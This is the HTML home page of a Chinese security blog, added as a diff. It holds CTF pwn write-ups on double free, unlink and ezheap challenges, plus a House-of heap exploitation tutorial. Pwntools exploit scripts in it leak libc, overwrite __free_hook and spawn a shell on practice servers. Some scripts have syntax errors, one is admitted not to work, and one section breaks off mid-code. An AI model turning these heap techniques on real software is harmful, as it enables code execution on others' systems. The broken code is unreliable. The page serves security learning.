@@ -1,0 +1,3172 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>良夜の小窝</title>
+    <meta name="author" content="良夜" />
+    <meta name="description" content="Here's an cat..." />
+    <meta name="keywords" content="良夜,博客,ice993" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/lty.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+<script src="/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/css/main.css" />
+<script src="/js/lib/click-effect.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>良夜の小窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;良夜の小窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div id="home-head">
+    <div
+        id="home-background"
+        ref="homeBackground"
+        data-images="/images/background.jpg"
+    ></div>
+    <div id="home-info" @click="homeClick">
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="info">
+            <div class="wrap">
+                <h1>良夜の小窝</h1>
+                <h3>良夜の小窝</h3>
+                <h5>Here&#39;s an cat...</h5>
+            </div>
+        </span>
+    </div>
+</div>
+<div
+    id="home-posts-wrap"
+    ref="homePostsWrap"
+    true
+>
+    <div id="home-posts">
+        
+
+<div class="post">
+    <a href="/2025/07/05/double_free%E5%92%8Cunlink/">
+        <h2 class="post-title">double free 与 unlink 利用</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/7/5
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="WUSTCTF-2020-easyfast"><a href="#WUSTCTF-2020-easyfast" class="headerlink" title="[WUSTCTF 2020]easyfast"></a>[WUSTCTF 2020]easyfast</h1><p>main函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531009249-ba7439b6-7ac9-46cf-be01-f36748023946.png"></p>
+<p>菜单</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531009430-a6ecb8d6-8eae-48ba-88ef-01f7c785b17e.png"></p>
+<p>add，我们只能申请四个堆块。要小于0x78</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531009208-a4c1c2dd-67c4-48d5-8095-43a4a0c6343b.png"></p>
+<p>Delete。这里free没有检查，有uaf</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531009304-65b846da-97ef-4871-ab26-9637835d1395.png"></p>
+<p>Edit，read只能读8个，一个地址的长度</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531009329-dcc78ab2-b788-46fd-a74e-43f687f4686e.png"></p>
+<p>Backdoor。后门的条件是这个地址数等于0</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010098-34bb718c-2f61-4fb8-b553-08dd94768eb6.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010172-ced52f51-7c99-41e5-9a14-06885a30ccac.png"></p>
+<p>我们要把指针改到602090这个位置去把它的数改成0.再去执行后门</p>
+<p>可以uaf。因为这块限制到了只能四次。先只用uaf</p>
+<p>先定义然后最后调用就行。这道题有后门。</p>
+<pre><code class="language-plain">from pwn import*
+io=remote(&#39;node5.anna.nssctf.cn&#39;,22674)
+#p=process(&#39;./service&#39;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+elf=ELF(&#39;./service&#39;)
+
+addr=0x602090-0x10
+
+def add(size):
+    io.sendlineafter(b&quot;choice&gt;\n&quot;,b&quot;1&quot;)
+    io.sendlineafter(b&quot;size&gt;\n&quot;,str(size))
+    
+def free(idx):
+    io.sendlineafter(b&quot;choice&gt;\n&quot;,b&quot;2&quot;)
+    io.sendlineafter(b&quot;index&gt;\n&quot;,str(idx))
+    
+def edit(idx,context):
+    io.sendlineafter(b&quot;choice&gt;\n&quot;,b&quot;3&quot;)
+    io.sendlineafter(b&quot;index&gt;\n&quot;,str(idx))
+    io.sendline(context)
+    
+def backdoor():
+    io.sendlineafter(b&quot;choice&gt;\n&quot;,b&quot;4&quot;)
+    
+if __name__==&quot;__main__&quot;
+    add(0x40）
+    free(0)
+    edit(0,p64(addr))
+    add(0x40）
+    add(0x40)
+    edit(2,p64(0))
+    backdoor()
+    io.interactive()
+</code></pre>
+<p>首先用一个堆块构造uaf,然后编辑它到目标地址。再申请chunk1，让它从free list里拿到chunk0。指针到了目标地址。在申请chunk2，指针返回给用户（chunk2 &#x3D; (void*)addr）</p>
+<p>然后我们再edit编辑chunk2，全改成0.因为read这只让读0x8，然后我们就写八字节的0覆盖掉就行</p>
+<p>最后执行后门判断，然后就会执行bin&#x2F;sh</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010366-da40f683-fadc-4603-bd69-4e23ff9ae71a.png"></p>
+<h2 id="有一点套路"><a href="#有一点套路" class="headerlink" title="有一点套路"></a>有一点套路</h2><p>Double free</p>
+<pre><code class="language-plain">add(0x20) # chunk0
+add(0x20) # chunk1
+free(0) # free chunk0
+free(1) # free chunk1
+free(0) # free chunk0
+</code></pre>
+<p>如上执行可以构造循环链表0→1→0, 再执行</p>
+<pre><code class="language-plain">add(0x20) # 分配出 chunk0
+add(0x20) # 分配出 chunk1
+edit(2, target_addr) # edit chunk0 fd指针
+add(0x20) # 分配出 chunk0
+add(0x20) # 申请到 target_addr 处的 chunk
+</code></pre>
+<p>就能劫持chunk到target_addr, 如果提供了edit功能, 就能得到任意地址写的能力</p>
+<p>它申请的时候会多0x10.好像是有个原理。地址计算的时候不能从90开始。要减去0x10，也是这个原理</p>
+<h1 id="SUCTF-2018-招新赛-unlink"><a href="#SUCTF-2018-招新赛-unlink" class="headerlink" title="[SUCTF 2018 招新赛]unlink"></a>[SUCTF 2018 招新赛]unlink</h1><p>菜单</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010239-9d7e2d00-3252-4e27-862c-eff8171c72f2.png"></p>
+<p>add函数，没有什么特别的地方</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010519-df114561-a8d7-48e3-ba34-db167c2da658.png"></p>
+<p>Free free的时候对buf进行了检查。没有uaf。if这有个数组越界？（看着是）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010819-8a1707ff-8866-4e3d-b9ab-ad21cdb1e252.png"></p>
+<p>show函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010918-481ac6f7-d67e-4045-8ea6-a1eba66484c5.png"></p>
+<p>Edit 编辑函数，它读入了0x100可能要堆溢出</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531010956-ebd8ca13-bc00-4925-9051-a89ea44b358d.png"></p>
+<p>题目说unlink，就堆溢出unlink来做。没有后门就要unlink来泄露libc</p>
+<p>unlink的常见手法就是构造三个堆块来做假的，然后改双链表的指针。这道题堆在bss段上</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531011315-d9632c4e-c0a7-4d43-9ce7-b2948140eb2e.png"></p>
+<p>我们要改0x6020c0这的指针。先申请三个chunk。最后一个是用来防止与top chunk合并的</p>
+<p>要利用bin的话就是满足fast bin和small bin或者unsort bin的大小来申请。</p>
+<p>fast一般要小于0x80 small bin是小于0x200（0x400）32和64好像不一样</p>
+<p>接下来交换指针，fd,bk减去用对应的假堆的偏移。后续交换指针</p>
+<p>再改到要指的位置，用show打印出puts函数got表的地址。泄露libc</p>
+<p>覆盖返回地址的时候用了一个free hook 。<a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/ZLF2wqKQUi2OwNkUnWVc3bILnzc">参考一下这个</a></p>
+<pre><code class="language-plain">from pwn import *
+from LibcSearcher import *
+#context(arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)
+ 
+# io=process(&#39;./service2&#39;)
+io=remote(&#39;node4.anna.nssctf.cn&#39;,28326)
+elf=ELF(&#39;./service2&#39;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+
+def add(size):
+    io.sendlineafter(b&#39;chooice :\n&#39;,b&#39;1&#39;)
+    io.sendlineafter(b&#39;size : \n&#39;,str(size).encode())
+ 
+def free(index):
+    io.sendlineafter(b&#39;chooice :\n&#39;,b&#39;2&#39;)
+    io.sendlineafter(b&#39;to delete\n&#39;,str(index).encode())
+ 
+def show(index):
+    io.sendlineafter(b&#39;chooice :\n&#39;,b&#39;3&#39;)
+    io.sendlineafter(b&#39;to show\n&#39;,str(index).encode())
+    io.recvuntil(b&#39;is : &#39;)
+ 
+def edit(index,payload):
+    io.sendlineafter(b&#39;chooice :\n&#39;,b&#39;4&#39;)
+    io.sendlineafter(b&#39;modify :\n&#39;,str(index).encode())
+    io.sendafter(b&#39;content\n&#39;,payload)
+ 
+
+buf=0x6020C0
+add(0x20) 
+add(0x80)  
+add(0x100) 
+
+prev_size=p64(0)
+chunk_size=p64(0x20)
+fd=buf-0x18
+bk=buf-0x10
+content=p64(fd)+p64(bk)
+fake_prev_size=p64(0x20)
+fake_chunk_size=p64(0x90)
+
+payload=prev_size+chunk_size+content+fake_prev_size+fake_chunk_size
+edit(0,payload)
+free(1)
+
+payload=p64(0)*3+p64(0x6020c8)
+edit(0,payload)
+
+payload=p64(elf.got[&#39;puts&#39;])
+edit(0,payload)
+
+show(1)
+puts=u64(io.recvuntil(b&#39;\x7f&#39;)[-6:]+b&#39;\x00\x00&#39;)
+print(hex(puts))
+
+libc_base=puts-libc.sym[&#39;puts&#39;]
+free_hook=libc_base+libc.sym[&#39;__free_hook&#39;]
+bin_sh=libc_base+next(libc.search(b&#39;/bin/sh\x00&#39;))
+payload=p64(free_hook)+p64(bin_sh)
+edit(0,payload)
+
+system=libc_base+libc.sym[&#39;system&#39;]
+edit(1,p64(system))
+
+free(2)
+ 
+io.interactive()
+</code></pre>
+<p>有字节转换的问题。网上查到了在str后面加.encode这个</p>
+<pre><code class="language-plain">str().encode()
+</code></pre>
+<h1 id="HNCTF-2022-WEEK4-ezheap"><a href="#HNCTF-2022-WEEK4-ezheap" class="headerlink" title="[HNCTF 2022 WEEK4]ezheap"></a>[HNCTF 2022 WEEK4]ezheap</h1><p>这道题没有uaf，题目给了libc。看一下函数</p>
+<p>Menu 这个是用来和用户交互的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531011128-d091b74c-3143-4913-9590-b419f464ff97.png"></p>
+<p>Main 判断比较复杂</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531011409-6ddd5dd0-f315-4091-af60-59240f027b9e.png"></p>
+<p>Edit 这看上去没啥问题。这个nbytes说的是可以溢出。溢出了不知道有啥用。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531011502-597f4446-6189-4f19-8e5a-06901699e7c1.png"></p>
+<p>Delete 对free后的指针做了判断</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531011644-7bb0eef8-e6d5-4c7b-95f4-b1def31e1e80.png"></p>
+<p>Show v1满足条件会返回一个地址</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531011756-484fbaf2-48c2-4549-8548-34b00252555b.png"></p>
+<p>Add add这里说这个是puts</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531012077-9e60a91f-82f4-446c-8842-a2ae8e645f67.png"></p>
+<p>是用show和add里的put来劫持地址。没打通</p>
+<pre><code class="language-plain">from pwn import*
+
+io=remote(&#39;node5.anna.nssctf.cn&#39;,23101)
+#io=process(&#39;./ezheap&#39;)
+elf = ELF(&#39;./ezheap&#39;)
+libc = ELF(&#39;./libc-2.23.so&#39;)
+
+def debug():
+    gdb.attach(io)
+    pause()
+
+def choice(idx):
+    io.sendlineafter(&quot;Choice: &quot;,str(idx).encode())
+
+def add(idx,size,name,content):
+    choice(1)
+    io.sendlineafter(&quot;Input your idx:&quot;,str(idx).encode())
+    io.sendlineafter(&quot;Size:&quot;,str(size).encode())
+    io.sendlineafter(&quot;Name: &quot;,str(name).encode())
+    io.sendlineafter(&quot;Content:&quot;,str(context).encode())
+
+def delete(idx):
+    choice(2)
+    io.sendlineafter(&quot;Input your idx:&quot;,str(idx).encode)
+    
+def show(idx):
+    choice(3)
+    io.sendlineafter(&quot;Input your idx:&quot;,str(idx).encode())
+    
+def edit(idx,size,contect):
+    choice(4)
+    io.sendlineafter(&quot;Input your idx:&quot;,str(idx).encode())
+    io.sendlineafter(&quot;Size:&quot;,str(size).encode())
+    io.sendline(contect)
+
+add(0,0x10,b&#39;good&#39;,b&#39;aaaa&#39;)
+add(1,0x10,b&#39;good&#39;,b&#39;aaaa&#39;)
+
+
+payload=p64(0)*3+p64(0x31)+p64(0)*2+p8(0x80)
+edit(0,0x31,payload)
+show(1)
+#debug()
+
+puts_addr = u64(io.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&quot;\x00&quot;))
+libc_base = puts_addr - libc.sym[&#39;puts&#39;]
+system = libc_base + libc.sym[&#39;system&#39;]
+
+payload = p64(0)*3+p64(0x31)+b&quot;bin/sh\x00&quot;+p64(0)*2+p64(1)+p64(system)
+edit(0,0x48,payload)
+show(1)
+io.interactive()
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531012322-4d96f22a-dada-4ac0-a593-764bc8eec6d2.png"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/pwn/" style="color: #00bcd4">pwn</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/heap/" style="color: #ff7d73">heap</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/double-free/" style="color: #ffa2c4">double-free</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/unlink/" style="color: #00bcd4">unlink</a>
+        </span>
+        
+    </div>
+    <a href="/2025/07/05/double_free%E5%92%8Cunlink/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/07/01/House%20of/">
+        <h2 class="post-title">House of 系列堆利用</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/7/1
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>模板都是ai给的例子，小修改了一下</p>
+<h2 id="1-House-of-spirit"><a href="#1-House-of-spirit" class="headerlink" title="1.House of spirit"></a>1.House of spirit</h2><p>骗过分配器把假chunk分配给fastbin</p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p>
+<h3 id="版本范围"><a href="#版本范围" class="headerlink" title="版本范围"></a>版本范围</h3><p>2.23——至今</p>
+<h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>堆溢出修改size,伪造fake chunk ,然后通过对堆块的释放和排布。控制fake chunk</p>
+<p>申请A,B,C,D</p>
+<p>对A进行溢出，修改B的范围，让它包括C。</p>
+<p>释放B，申请B，然后再释放C，然后我们可以通过修改B的内容，控制C</p>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>新版是tcachebin，需要改一下。</p>
+<p>我们劫持tcachebin&#x2F;fastbin的fd以后，可以分配读写任意地址</p>
+<h3 id="模板："><a href="#模板：" class="headerlink" title="模板："></a>模板：</h3><pre><code class="language-c">#include 
+#include 
+
+int main() &#123;
+    // ---------------------------------------------------
+    // 1. 内存布局构造 (模拟栈上的情况)
+    // 我们定义一个结构体，确保内存是连续分配的。
+    // 在真实的 Pwn 场景中，这些数据通常是通过溢出或任意写布置在栈上的。
+    // ---------------------------------------------------
+    struct &#123;
+        unsigned long long prev_size;
+        unsigned long long size;        // Fake Chunk 的大小
+        char data[0x40];                // 分配后供用户写入的区域 (大小为 64 字节)
+        unsigned long long target;      // 【目标变量】我们想要篡改的值
+        unsigned long long next_prev_size;
+        unsigned long long next_size;   // Next Chunk 的大小 (用于绕过检查)
+    &#125; fake_stack_layout __attribute__ ((aligned (16))); // 确保 16 字节对齐
+
+    // 初始化目标变量为一个安全的值
+    fake_stack_layout.target = 0xdeadbeef;
+    printf(&quot;[*] 初始 Target 变量的值: 0x%llx\n&quot;, fake_stack_layout.target);
+
+    // ---------------------------------------------------
+    // 2. 伪造 Chunk Metadata (头部信息)
+    // ---------------------------------------------------
+    // 我们想申请 0x40 的数据区，加上 0x10 的 header，总 chunk 大小为 0x50
+    fake_stack_layout.prev_size = 0;
+    fake_stack_layout.size = 0x50; 
+
+    // 伪造 Next Chunk 的 size，必须满足 2*SIZE_SZ system_mem
+    // 这是 House of Spirit 成功绕过 glibc 安全检查的关键
+    fake_stack_layout.next_size = 0x1234; 
+
+    // ---------------------------------------------------
+    // 3. 触发 House of Spirit 攻击
+    // ---------------------------------------------------
+    // 计算传给 free 的指针（必须指向 chunk 的 data 区域首地址）
+    void *fake_ptr = &amp;fake_stack_layout.data;
+    
+    printf(&quot;[*] 正在将栈上的伪造指针 %p 传入 free()...\n&quot;, fake_ptr);
+    // 此时 glibc 会检查 fake_ptr 附近我们伪造的 size 和 next_size
+    // 检查通过后，这个栈地址会被放入 0x50 大小的 fastbin 链表中
+    free(fake_ptr); 
+
+    // ---------------------------------------------------
+    // 4. 再次分配，接管栈区
+    // ---------------------------------------------------
+    printf(&quot;[*] 正在调用 malloc(0x40) 重新申请内存...\n&quot;);
+    // glibc 发现 0x50 的 fastbin 中刚好有一个空闲块（就是我们刚释放的栈地址），直接返回给我们
+    void *vuln_ptr = malloc(0x40); 
+    printf(&quot;[*] Malloc 返回的地址: %p\n&quot;, vuln_ptr);
+
+    // ---------------------------------------------------
+    // 5. 实施篡改
+    // ---------------------------------------------------
+    if (vuln_ptr == fake_ptr) &#123;
+        printf(&quot;[+] 成功骗过分配器，拿到了栈上的地址！\n&quot;);
+        
+        // 我们通过拿到的堆指针往里写数据，越界覆盖掉 target
+        // 0x40 bytes = 8 个 unsigned long long，所以第 9 个元素正好是 target 的位置
+        unsigned long long *exploit_ptr = (unsigned long long *)vuln_ptr;
+        exploit_ptr[8] = 0xcafebabe; // 恶意覆盖
+        
+        printf(&quot;[*] 篡改后的 Target 变量的值: 0x%llx\n&quot;, fake_stack_layout.target);
+        printf(&quot;[+] House of Spirit 攻击演示完成！\n&quot;);
+    &#125; else &#123;
+        printf(&quot;[-] 攻击失败，返回的地址不匹配。\n&quot;);
+    &#125;
+
+    return 0;
+&#125;
+</code></pre>
+<p>exp脚本</p>
+<pre><code class="language-python">from pwn import *
+
+# =========================================================
+# 1. 环境配置与初始化
+# =========================================================
+# context.log_level = &#39;debug&#39;
+context.arch = &#39;amd64&#39;
+context.os = &#39;linux&#39;
+
+elf = ELF(&#39;./pwn_challenge&#39;)
+# libc = ELF(&#39;./libc.so.6&#39;) 
+
+io = process(&#39;./pwn_challenge&#39;)
+# io = remote(&#39;x.x.x.x&#39;, 1337)
+
+# =========================================================
+# 2. 交互辅助函数 (根据目标程序的菜单进行封装)
+# =========================================================
+def add(size, content):
+    io.sendlineafter(b&quot;&gt; &quot;, b&quot;1&quot;)
+    io.sendlineafter(b&quot;Size: &quot;, str(size).encode())
+    io.sendafter(b&quot;Content: &quot;, content)
+
+def delete(index):
+    io.sendlineafter(b&quot;&gt; &quot;, b&quot;2&quot;)
+    io.sendlineafter(b&quot;Index: &quot;, str(index).encode())
+
+def trigger_vuln_free(addr):
+    # 假设程序有一个特定的漏洞点，允许你释放任意一个地址
+    io.sendlineafter(b&quot;&gt; &quot;, b&quot;3&quot;)
+    io.sendlineafter(b&quot;Address to free: &quot;, str(addr).encode())
+
+# =========================================================
+# 3. 核心攻击逻辑
+# =========================================================
+def exploit():
+    # --- 阶段一：信息泄露 (假设我们已经通过某种方式泄露了栈地址和 libc 基址) ---
+    # 真实场景中，由于存在 ASLR，你需要先 leak 出栈地址，才能知道伪造 chunk 的确切位置
+    stack_leak = 0x7fffffffe000 # 假设这是泄露出的栈上某变量的地址
+    target_ret_addr = stack_leak + 0x20 # 计算出当前函数返回地址所在的精确栈位置
+
+    log.success(f&quot;Target Return Address: &#123;hex(target_ret_addr)&#125;&quot;)
+
+    # --- 阶段二：在栈上构造 Fake Chunk ---
+    # 我们打算在 target_ret_addr 的上方一点伪造 chunk header
+    # 假设目标大小为 0x50 (包含 header)，对应 malloc(0x40)
+    fake_chunk_addr = target_ret_addr - 0x10 # Fake chunk 的起始地址 (prev_size 的位置)
+    fake_chunk_mem  = fake_chunk_addr + 0x10 # 传给 free 的地址 (data 区域的起始位置)
+
+    # 构造 Fake Chunk Payload
+    # 假设我们通过栈溢出或格式化字符串漏洞，能往栈上写入这些数据
+    payload = flat([
+        0,                  # prev_size
+        0x50,               # size (当前 chunk 大小，放入 0x50 的 fastbin)
+        b&#39;A&#39; * 0x40,        # data 区域的填充物
+        0,                  # next_prev_size
+        0x1234              # next_size (必须满足检查: 2*SIZE_SZ fd;								      \
+    BK = P-&gt;bk;								      \
+    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \
+      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \
+    else &#123;								      \
+		// .....							      \
+      &#125;									      \
+&#125;
+</code></pre>
+<p>只需要绕过__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0) 即可，因此，不需要伪造地址处于高位的 chunk 的 presize 域。</p>
+<p>高版本的unlink</p>
+<pre><code class="language-c">/* Take a chunk off a bin list.  */
+static void
+unlink_chunk (mstate av, mchunkptr p)
+&#123;
+  if (chunksize (p) != prev_size (next_chunk (p)))
+    malloc_printerr (&quot;corrupted size vs. prev_size&quot;);
+
+  mchunkptr fd = p-&gt;fd;
+  mchunkptr bk = p-&gt;bk;
+
+  if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))
+    malloc_printerr (&quot;corrupted double-linked list&quot;);
+	// ......
+&#125;
+</code></pre>
+<p>新增了这一行做检查：</p>
+<pre><code class="language-c">chunksize (p) != prev_size (next_chunk (p))
+</code></pre>
+<p>伪造的时候需要绕过</p>
+<h3 id="模板：-1"><a href="#模板：-1" class="headerlink" title="模板："></a>模板：</h3><pre><code class="language-c">#include 
+#include 
+#include 
+#include 
+
+int main() &#123;
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    printf(&quot;[*] 正在分配 Chunk A, B, C, D...\n&quot;);
+    // 分配大小需在 unsorted bin 范围内 (大于 fastbin 大小，通常 &gt; 0x80)
+    char *a = malloc(0xf8); 
+    char *b = malloc(0xf8); // 受害者 Chunk
+    char *c = malloc(0xf8); 
+    char *d = malloc(0x10); // 隔离 Top Chunk 的 Gap
+
+    printf(&quot;Chunk A 地址: %p\n&quot;, a);
+    printf(&quot;Chunk B 地址: %p\n&quot;, b);
+    printf(&quot;Chunk C 地址: %p\n&quot;, c);
+    printf(&quot;Chunk D (Gap) 地址: %p\n&quot;, d);
+
+    // 1. 释放 A，使其进入 unsorted bin
+    printf(&quot;\n[*] 释放 Chunk A...\n&quot;);
+    free(a);
+
+    // 2. 核心：在 B 中触发 Off-By-Null 漏洞
+    printf(&quot;[*] 模拟向 Chunk B 写入数据，触发 Off-By-Null...\n&quot;);
+    // 伪造 C 的 prev_size。A(0x100) + B(0x100) = 0x200 (这里是包含 header 的大小)
+    // 假设程序有漏洞，允许我们在 B 的末尾写 prev_size
+    *(unsigned long long *)(b + 0xf0) = 0x200; 
+
+    // 触发单字节溢出，覆盖 C 的 P 位为 0 (0x101 -&gt; 0x100)
+    // 真实的漏洞可能是 strcpy 或者 read 导致的 off-by-null
+    b[0xf8] = &#39;\x00&#39;; 
+    printf(&quot;[+] 成功篡改 Chunk C 的 prev_size 和 P 位。\n&quot;);
+
+    // 3. 释放 C，触发向后合并
+    printf(&quot;\n[*] 释放 Chunk C，触发合并 (Backward Coalescing)...\n&quot;);
+    free(c); 
+    printf(&quot;[+] 合并完成！现在 A, B, C 已经合并为一个 0x300 大小的 Unsorted Bin Chunk。\n&quot;);
+
+    // 4. 利用 Overlapping
+    printf(&quot;\n[*] 重新申请一块大的内存 (覆盖 A 和 B)...\n&quot;);
+    char *overlap = malloc(0x1f8); // 申请大小足以跨越 A 并覆盖到 B
+    
+    // 我们向新的 chunk 写入特定的特征码
+    strcpy(overlap + 0x100, &quot;YOU_ARE_HACKED_VIA_OVERLAPPING!&quot;);
+
+    // 此时程序依然认为 b 是合法的指针，并打印 b 的内容
+    printf(&quot;[!] 读取受害者 Chunk B 的内容: %s\n&quot;, b);
+
+    return 0;
+&#125;
+</code></pre>
+<p>exp</p>
+<pre><code class="language-python">from pwn import *
+
